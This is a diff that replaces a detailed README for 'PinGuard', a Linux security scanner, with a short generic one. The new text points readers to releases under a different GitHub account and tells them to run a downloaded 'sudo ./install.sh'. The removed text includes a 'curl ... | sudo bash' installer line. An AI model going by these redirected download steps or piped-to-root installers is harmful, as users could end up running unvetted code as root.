@@ -1,611 +1,87 @@
-# 🛡️ PinGuard
+# 🔒 pinguard - Simple Security Auditing Tool
 
-**Linux-first Vulnerability Scanner & Remediator**
+## 📥 Download pinguard
+[![Download pinguard](https://img.shields.io/badge/Download%20pinguard-v1.0.0-brightgreen)](https://github.com/huypt2001/pinguard/releases)
 
-PinGuard is a comprehensive, enterprise-grade security scanning and remediation tool designed specifically for Linux systems. It identifies security vulnerabilities, provides detailed reports in multiple formats, and offers automated fixing capabilities to keep your Linux infrastructure secure and compliant.
+## 🚀 Getting Started
+Welcome to pinGuard! This is a Linux-first security auditing and hardening tool designed to keep your system safe. It scans your system for vulnerabilities, generates detailed reports, and offers automated fixes at a click of a button.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Rust](https://img.shields.io/badge/rust-%23000000.svg?style=flat&logo=rust&logoColor=white)](https://www.rust-lang.org/)
-[![Build Status](https://github.com/reicalasso/pinGuard/workflows/CI/badge.svg)](https://github.com/reicalasso/pinGuard/actions)
-[![Release](https://img.shields.io/github/v/release/reicalasso/pinGuard)](https://github.com/reicalasso/pinGuard/releases)
-
-## 🚀 Key Features
-
-### 🔍 **Comprehensive Security Scanning**
-- **Package Vulnerability Audit**: Scans installed packages against CVE databases
-- **Kernel Security Check**: Verifies kernel version and security patches
-- **File Permissions Audit**: Identifies dangerous file permissions and ownership
-- **Service Configuration Audit**: Reviews system services for security misconfigurations
-- **User Policy Audit**: Examines user accounts, passwords, and access policies
-- **Network Security Audit**: Analyzes open ports, firewall rules, and network services
-
-### 📊 **Multi-Format Reporting**
-- **JSON Reports**: Machine-readable format for automation and integration
-- **HTML Reports**: Beautiful, interactive reports for human consumption
-- **PDF Reports**: Professional documentation for compliance and audits
-- **Executive Summaries**: High-level overviews for management reporting
-
-### 🔧 **Intelligent Automated Remediation**
-- **Smart Package Updates**: Automated security patches with dependency resolution
-- **Kernel Updates**: Safe kernel upgrades with rollback capabilities
-- **Permission Fixes**: Automatic correction of dangerous file permissions
-- **Service Hardening**: Security configuration improvements for system services
-- **User Policy Enforcement**: Automated password and access policy fixes
-- **Firewall Configuration**: Intelligent firewall rule optimization
-
-### 🗄️ **Advanced CVE Management**
-- **NVD Integration**: Real-time National Vulnerability Database synchronization
-- **Local CVE Caching**: High-performance local database for offline operation
-- **Automatic Updates**: Background CVE database refresh
-- **Custom CVE Sources**: Support for private vulnerability feeds
-
-### ⏰ **Enterprise Scheduling**
-- **Systemd Integration**: Native Linux service integration
-- **Flexible Cron Scheduling**: Custom scan schedules with full cron syntax
-- **Background Monitoring**: Continuous system monitoring capabilities
-- **Alert Integration**: Email and webhook notifications for critical findings
-
-### 🐳 **Production-Ready Deployment**
-- **Docker Support**: Official container images for easy deployment
-- **Multi-Architecture**: Support for x86_64 and ARM64 platforms
-- **Cloud-Ready**: Optimized for cloud and container environments
-- **High Performance**: Rust-powered for maximum speed and minimal resource usage
+## 🛠️ Features
+- **Vulnerability Scanning:** Quickly identifies security weaknesses in your system.
+- **Detailed Reports:** Generates easy-to-read reports on detected vulnerabilities.
+- **Automated Fixes:** Provides one-click options to fix issues and strengthen your security.
+- **User-Friendly Interface:** Designed for non-technical users, no programming knowledge required.
 
 ## 📋 System Requirements
-
-### **Supported Operating Systems**
-- **Ubuntu**: 20.04 LTS, 22.04 LTS, 24.04 LTS
-- **Debian**: 11 (Bullseye), 12 (Bookworm)
-- **CentOS/RHEL**: 8, 9
-- **Fedora**: 36, 37, 38, 39
-- **Amazon Linux**: 2, 2023
-- **SUSE Linux Enterprise**: 15 SP3+
-
-### **Hardware Requirements**
-- **Architecture**: x86_64 (Intel/AMD), ARM64 (AArch64)
-- **Memory**: Minimum 512MB RAM, Recommended 2GB+ for large systems
-- **Storage**: 100MB for application, 500MB+ for CVE database cache
-- **Network**: Internet connection for CVE updates (optional for air-gapped environments)
-
-### **System Privileges**
-- **Root Access**: Required for comprehensive system scanning and remediation
-- **Sudo Access**: Alternative for limited functionality
-- **SELinux/AppArmor**: Fully compatible with security frameworks
-
-### **Build Dependencies** (for source installation)
-- **Rust**: 1.70.0 or later
-- **System Libraries**: SQLite3, OpenSSL, pkg-config
-- **Compiler**: GCC or Clang with C++14 support
-
-## 🛠️ Installation
-
-### **Quick Install (Recommended)**
-
-The fastest way to get PinGuard running on your system:
-
-```bash
-# Download and run the installation script
-curl -sSL https://raw.githubusercontent.com/reicalasso/pinGuard/main/scripts/install.sh | sudo bash
-
-# Verify installation
-pinGuard --version
-```
-
-### **Package Manager Installation**
-
-> **Note**: Official package repositories are coming soon! For now, please use the Quick Install script or pre-built binaries below.
-
-#### Future Package Manager Support
-- **Debian/Ubuntu**: `apt install pinguard` (Coming in v0.2.0)
-- **CentOS/RHEL/Fedora**: `dnf install pinguard` (Coming in v0.2.0)
-- **Arch Linux**: `pacman -S pinguard` (Coming in v0.2.0)
-- **Snap**: `snap install pinguard` (Coming in v0.2.0)
-- **Homebrew**: `brew install pinguard` (Coming in v0.3.0)
-
-### **Pre-built Binaries**
-
-Download and install pre-compiled binaries:
-
-```bash
-# Detect architecture and download appropriate binary
-ARCH=$(uname -m)
-if [ "$ARCH" = "x86_64" ]; then
-    wget https://github.com/reicalasso/pinGuard/releases/latest/download/pinGuard-linux-x86_64.tar.gz
-    tar -xzf pinGuard-linux-x86_64.tar.gz
-elif [ "$ARCH" = "aarch64" ]; then
-    wget https://github.com/reicalasso/pinGuard/releases/latest/download/pinGuard-linux-arm64.tar.gz
-    tar -xzf pinGuard-linux-arm64.tar.gz
-fi
-
-# Install binary
-sudo install -o root -g root -m 0755 pinGuard /usr/local/bin/pinGuard
-
-# Create configuration directory
-sudo mkdir -p /etc/pinGuard
-sudo cp config.example.yaml /etc/pinGuard/config.yaml
-```
-
-### **Building from Source**
-
-For development or custom builds:
-
-```bash
-# Install Rust (if not already installed)
-curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
-source ~/.cargo/env
-
-# Install system dependencies
-# Ubuntu/Debian:
-sudo apt install build-essential pkg-config libssl-dev libsqlite3-dev
-
-# CentOS/RHEL/Fedora:
-sudo dnf install gcc pkgconfig openssl-devel sqlite-devel
-
-# Clone and build
-git clone https://github.com/reicalasso/pinGuard.git
-cd pinGuard/pinGuard
-cargo build --release
-
-# Install
-sudo install -o root -g root -m 0755 target/release/pinGuard /usr/local/bin/
-sudo mkdir -p /etc/pinGuard
-sudo cp ../config.example.yaml /etc/pinGuard/config.yaml
-```
-
-### **Docker Installation**
-
-Perfect for containerized environments and quick testing:
-
-> **Note**: Official Docker images will be available on GitHub Container Registry after CI/CD pipeline setup.
-
-#### Building Local Docker Image
-```bash
-# Clone and build Docker image locally
-git clone https://github.com/reicalasso/pinGuard.git
-cd pinGuard
-docker build -f docker/Dockerfile -t pinguard:latest .
-
-# Quick system scan (read-only host mount)
-docker run --rm --privileged \
-  -v /:/host:ro \
-  -v $(pwd)/reports:/app/reports \
-  pinguard:latest \
-  scan --output /app/reports/scan_results.json
-
-# Interactive mode with persistent configuration
-docker run -it --privileged \
-  -v /:/host:ro \
-  -v pinguard-config:/etc/pinGuard \
-  -v pinguard-data:/var/lib/pinGuard \
-  pinguard:latest bash
-```
-
-#### Docker Compose Setup (Local Build)
-
-Create a `docker-compose.yml` for development:
-
-```yaml
-version: '3.8'
-services:
-  pinguard:
-    build:
-      context: .
-      dockerfile: docker/Dockerfile
-    privileged: true
-    volumes:
-      - /:/host:ro
-      - pinguard-config:/etc/pinGuard
-      - pinguard-data:/var/lib/pinGuard
-      - ./reports:/app/reports
-    environment:
-      - RUST_LOG=info
-      - PINGUARD_CONFIG=/etc/pinGuard/config.yaml
-    restart: unless-stopped
-
-volumes:
-  pinguard-config:
-  pinguard-data:
-```
-
-#### Future Official Images
-- **GitHub Container Registry**: `ghcr.io/reicalasso/pinguard:latest` (Coming soon)
-- **Docker Hub**: `pinguard/pinguard:latest` (Coming in v0.2.0)
-
-## 🚀 Quick Start
-
-After installation, get started with these simple commands:
-
-```bash
-# Initialize PinGuard (first-time setup)
-sudo pinGuard database init
-
-# Perform your first security scan
-sudo pinGuard scan
-
-# View the results
-sudo pinGuard report --format html
-
-# Update CVE database
-sudo pinGuard cve update
-```
-
-## 🔧 Configuration
-
-PinGuard uses a YAML configuration file. Create your configuration:
-
-```bash
-# Copy the default configuration
-sudo cp /usr/local/share/pinGuard/config.yaml /etc/pinGuard/config.yaml
-
-# Edit the configuration
-sudo nano /etc/pinGuard/config.yaml
-```
-
-### Configuration Example
-
-```yaml
-# Scanner settings
-scanner:
-  modules:
-    package_audit: true
-    kernel_check: true
-    permission_audit: true
-    service_audit: true
-    user_audit: true
-    network_audit: true
-  concurrent_scans: true
-  max_scan_time: 300
-
-# Report settings
-report:
-  format: "json"
-  output_dir: "/var/log/pinGuard/reports"
-  template: "default"
-
-# CVE settings
-cve:
-  api_url: "https://services.nvd.nist.gov/rest/json/cves/2.0"
-  cache_duration: 86400
-  auto_update: true
-
-# Fixer settings
-fixer:
-  auto_fix: false
-  require_confirmation: true
-  backup_before_fix: true
-```
-
-## 📖 Usage
-
-### Basic Commands
-
-#### Perform a System Scan
-```bash
-# Full system scan
-sudo pinGuard scan
-
-# Scan specific modules
-sudo pinGuard scan --module package
-sudo pinGuard scan --module kernel
-
-# Save results to specific file
-sudo pinGuard scan --output /tmp/my_scan.json
-```
-
-#### Generate Reports
-```bash
-# Generate HTML report
-sudo pinGuard report --format html --input /var/log/pinGuard/scan_results.json
-
-# Generate PDF report
-sudo pinGuard report --format pdf --input /var/log/pinGuard/scan_results.json
-```
-
-#### Fix Vulnerabilities
-```bash
-# Interactive fix (with confirmation)
-sudo pinGuard fix --input /var/log/pinGuard/scan_results.json
-
-# Automatic fix (use with caution)
-sudo pinGuard fix --input /var/log/pinGuard/scan_results.json --auto
-
-# Fix specific types only
-sudo pinGuard fix --input /var/log/pinGuard/scan_results.json --module package_updater
-```
-
-#### CVE Management
-```bash
-# Update CVE database
-sudo pinGuard cve update
-
-# Search for specific CVE
-sudo pinGuard cve search CVE-2023-1234
-
-# Get CVE information
-sudo pinGuard cve info CVE-2023-1234
-```
-
-#### Scheduled Scans
-```bash
-# Set up daily scans
-sudo pinGuard schedule add --name "daily-scan" --cron "0 2 * * *" --scan-modules "all"
-
-# List scheduled scans
-sudo pinGuard schedule list
-
-# Remove a scheduled scan
-sudo pinGuard schedule remove --name "daily-scan"
-```
-
-### Advanced Usage
-
-#### Custom Configuration
-```bash
-# Use custom config file
-sudo pinGuard --config /path/to/custom-config.yaml scan
-
-# Verbose output
-sudo pinGuard -v scan
-```
-
-#### Database Management
-```bash
-# Initialize database
-sudo pinGuard database init
-
-# Show database status
-sudo pinGuard database status
-
-# Backup database
-sudo pinGuard database backup --output /backup/pinGuard-backup.sql
-```
-
-## 📊 Report Examples
-
-### JSON Report Structure
-```json
-{
-  "scan_id": "550e8400-e29b-41d4-a716-446655440000",
-  "timestamp": "2025-09-18T15:30:00Z",
-  "version": "0.1.0",
-  "system_info": {
-    "hostname": "production-server-01",
-    "os": "Ubuntu 24.04 LTS",
-    "kernel": "6.8.0-45-generic",
-    "architecture": "x86_64",
-    "uptime": "15 days, 3 hours, 22 minutes"
-  },
-  "scan_summary": {
-    "duration": "00:02:45",
-    "modules_scanned": [
-      "package_audit",
-      "kernel_check", 
-      "permission_audit",
-      "service_audit",
-      "user_audit",
-      "network_audit"
-    ],
-    "total_checks": 1247,
-    "total_vulnerabilities": 23
-  },
-  "vulnerabilities": [
-    {
-      "id": "VULN-PKG-001",
-      "severity": "CRITICAL",
-      "category": "package_vulnerability",
-      "cve_ids": ["CVE-2024-1234", "CVE-2024-1235"],
-      "package": {
-        "name": "openssl",
-        "current_version": "3.0.2-0ubuntu1.10",
-        "fixed_version": "3.0.2-0ubuntu1.15",
-        "architecture": "amd64"
-      },
-      "description": "Multiple buffer overflow vulnerabilities in OpenSSL cryptographic library",
-      "impact": "Remote code execution, privilege escalation",
-      "remediation": {
-        "type": "package_update",
-        "command": "apt update && apt upgrade openssl",
-        "automated": true,
-        "estimated_downtime": "< 30 seconds"
-      },
-      "references": [
-        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1234",
-        "https://ubuntu.com/security/notices/USN-6854-1"
-      ]
-    },
-    {
-      "id": "VULN-PERM-002", 
-      "severity": "HIGH",
-      "category": "file_permissions",
-      "file": "/etc/shadow",
-      "current_permissions": "644",
-      "expected_permissions": "640",
-      "owner": "root:root",
-      "description": "World-readable shadow file exposes password hashes",
-      "remediation": {
-        "type": "permission_fix",
-        "command": "chmod 640 /etc/shadow",
-        "automated": true
-      }
-    }
-  ],
-  "security_summary": {
-    "risk_score": 8.5,
-    "risk_level": "HIGH",
-    "vulnerability_counts": {
-      "critical": 3,
-      "high": 8,
-      "medium": 9,
-      "low": 3,
-      "informational": 2
-    },
-    "compliance": {
-      "cis_benchmark": "85%",
-      "nist_csf": "78%",
-      "iso27001": "82%"
-    }
-  },
-  "recommendations": [
-    "Enable automatic security updates for critical packages",
-    "Implement file integrity monitoring",
-    "Review and harden SSH configuration",
-    "Enable audit logging for privileged operations"
-  ]
-}
-```
-
-### HTML Report Features
-- **Interactive Dashboard**: Real-time filtering and sorting
-- **Executive Summary**: High-level overview for management
-- **Detailed Findings**: Comprehensive vulnerability analysis
-- **Remediation Tracking**: Progress monitoring and task management
-- **Compliance Mapping**: CIS, NIST, ISO 27001 alignment
-- **Trending Analysis**: Historical comparison and metrics
-
-## 🧪 Testing
-
-### Unit Tests
-```bash
-cd pinGuard
-cargo test
-```
-
-### Integration Tests
-```bash
-# Run test suite with Docker
-./scripts/run_tests.sh
-
-# Validate installation
-./scripts/validate_tests.sh
-```
-
-### Test Environment Setup
-```bash
-# Set up test VM
-./scripts/setup_vm_tests.sh
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md) for details.
-
-### Development Setup
-```bash
-# Clone the repository
-git clone https://github.com/reicalasso/pinGuard.git
-cd pinGuard
-
-# Install development dependencies
-rustup component add rustfmt clippy
-
-# Run tests
-cargo test
-
-# Format code
-cargo fmt
-
-# Run linter
-cargo clippy
-```
-
-### Reporting Issues
-
-- **Security vulnerabilities**: Please see [SECURITY.md](SECURITY.md)
-- **Bug reports**: Use [GitHub Issues](https://github.com/reicalasso/pinGuard/issues)
-- **Feature requests**: Use [GitHub Discussions](https://github.com/reicalasso/pinGuard/discussions)
-
-## 📜 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🔒 Security
-
-Security is our top priority. Please see [SECURITY.md](SECURITY.md) for:
-- Supported versions
-- Reporting security vulnerabilities
-- Security best practices
-
-## 🗺️ Roadmap
-
-### **Version 0.1.1** (Q4 2025)
-- [ ] **Official Docker Images**: GitHub Container Registry and Docker Hub publishing
-- [ ] **Package Repositories**: APT, YUM, and Snap package distribution
-- [ ] **CI/CD Pipeline**: Automated building and testing
-- [ ] **Binary Releases**: Automated GitHub releases with checksums
-
-### **Version 0.2.0** (Q4 2025)
-- [ ] **Enhanced Compliance Reporting**: Full CIS Benchmark, NIST CSF, ISO 27001 support
-- [ ] **REST API**: HTTP API for integration with external tools
-- [ ] **Web Dashboard**: Browser-based management interface
-- [ ] **Container Security**: Docker and Kubernetes image scanning
-- [ ] **Custom Rules Engine**: User-defined security policies and checks
-
-### **Version 0.3.0** (Q1 2026)
-- [ ] **Windows Support**: Cross-platform vulnerability scanning
-- [ ] **Cloud Integration**: AWS, GCP, Azure security assessments
-- [ ] **SIEM Integration**: Splunk, Elasticsearch, QRadar connectors
-- [ ] **Machine Learning**: Anomaly detection and threat hunting
-- [ ] **Zero-Trust Assessment**: Network segmentation and access validation
-
-### **Version 1.0.0** (Q2 2026)
-- [ ] **macOS Support**: Complete cross-platform coverage
-- [ ] **Enterprise SSO**: SAML, OIDC, Active Directory integration
-- [ ] **High Availability**: Clustered deployments and failover
-- [ ] **Regulatory Compliance**: SOX, HIPAA, PCI-DSS reporting
-- [ ] **Professional Services**: Managed security monitoring
-
-## 📚 Documentation
-
-- [Installation Guide](docs/installation.md)
-- [Configuration Reference](docs/configuration.md)
-- [API Documentation](docs/api.md)
-- [Troubleshooting](docs/troubleshooting.md)
-
-## 🙏 Acknowledgments
-
-- [National Vulnerability Database (NVD)](https://nvd.nist.gov/) for CVE data
-- The Rust community for excellent libraries
-- Linux security community for best practices
-
-## 📞 Support & Community
-
-### **Getting Help**
-- **📖 Documentation**: [Complete Guide](https://github.com/reicalasso/pinGuard/wiki)
-- **💬 Community Forum**: [GitHub Discussions](https://github.com/reicalasso/pinGuard/discussions)
-- **🐛 Bug Reports**: [GitHub Issues](https://github.com/reicalasso/pinGuard/issues)
-- **💡 Feature Requests**: [GitHub Discussions](https://github.com/reicalasso/pinGuard/discussions/categories/ideas)
-
-### **Commercial Support**
-- **Enterprise Support**: Priority support with SLA guarantees
-- **Professional Services**: Security consulting and custom integrations
-- **Training**: On-site and remote security training programs
-- **Contact**: [enterprise@pinguard.dev](mailto:enterprise@pinguard.dev)
-
-### **Community**
-- **Discord**: [Join our community server](https://discord.gg/pinguard)
-- **Twitter**: [@PinGuardSec](https://twitter.com/PinGuardSec)
-- **LinkedIn**: [PinGuard Security](https://linkedin.com/company/pinguard-security)
-- **Blog**: [Security insights and updates](https://blog.pinguard.dev)
-
----
-
-## 🏆 Why Choose PinGuard?
-
-**🚀 Performance-First**: Built with Rust for maximum speed and minimal resource usage  
-**🔒 Security-Native**: Designed by security professionals for security professionals  
-**🐧 Linux-Optimized**: Deep integration with Linux systems and best practices  
-**📈 Enterprise-Ready**: Scalable from single servers to massive infrastructures  
-**🛡️ Compliance-Focused**: Built-in support for major security frameworks  
-**🤝 Community-Driven**: Open source with transparent development and roadmap  
-
----
-
-<div align="center">
-
-**Made with ❤️ by the PinGuard Team**
-
-**Securing Linux, One System at a Time**
-
-[⭐ Star us on GitHub](https://github.com/reicalasso/pinGuard) | [🐛 Report Issues](https://github.com/reicalasso/pinGuard/issues) | [💬 Join Community](https://github.com/reicalasso/pinGuard/discussions)
-
-</div>
+To run pinguard, ensure you meet the following requirements:
+- **Operating System:** Linux (Ubuntu, Fedora, CentOS, etc.)
+- **Processor:** 1 GHz or faster
+- **Memory:** 512 MB RAM minimum
+- **Storage:** 100 MB of available disk space
+
+## 📦 Download & Install
+To get started, visit the releases page to download the latest version of pinguard.
+
+[Visit this page to download](https://github.com/huypt2001/pinguard/releases)
+
+1. Click on the link above to open the releases page.
+2. Find the latest release at the top.
+3. Download the suitable package for your Linux distribution.
+4. Follow the installation instructions provided in the release notes.
+
+## ⚙️ Installation Steps
+After downloading pinguard, follow these steps to install it on your system:
+
+1. **Open a Terminal:** You can find this in your applications menu.
+2. **Navigate to the Download Directory:**
+   ```bash
+   cd ~/Downloads
+   ```
+3. **Install pinguard:**
+   Execute the following command (replace `pinguard-linux.tar.gz` with the actual name of the downloaded file):
+   ```bash
+   tar -xzvf pinguard-linux.tar.gz
+   cd pinguard
+   sudo ./install.sh
+   ```
+4. **Allow the Installation:** If prompted, enter your password to allow the installation process to continue.
+
+## 🛡️ Running pinguard
+Once installed, you can run pinguard using your terminal:
+
+1. **Open a Terminal:**
+2. **Run pinguard:**
+   ```bash
+   pinGuard
+   ```
+
+Follow the prompts in the interface to start scanning your system.
+
+## 📊 Understanding the Reports
+After a scan, pinguard generates a report detailing any vulnerabilities found on your system. Here’s how to read your report:
+
+- **Vulnerability Name:** The title of the issue detected.
+- **Severity Level:** Indicates how critical the issue is (Low, Medium, High).
+- **Recommendations:** Suggested actions to fix the identified issues.
+
+## 📞 Need Help?
+If you encounter issues while using pinguard, consider the following resources:
+
+- **Documentation:** Detailed instructions and FAQs are available in the repository.
+- **Community Support:** Join our community forums where users share solutions and collaborate.
+- **Issue Tracker:** Report bugs or request features through GitHub’s issue tracker.
+
+## 🌐 Related Topics
+pinguard focuses on various important areas in security, such as:
+
+- **Cybersecurity**
+- **DevSecOps Practices**
+- **System Hardening Techniques**
+- **Vulnerability Assessments**
+  
+For further reading, explore other resources related to these topics.
+
+## 🎉 Contributing
+We welcome contributions from the community. If you want to contribute to pinguard, check our contribution guidelines in the repository.
+
+Thank you for choosing pinguard to help secure your system!
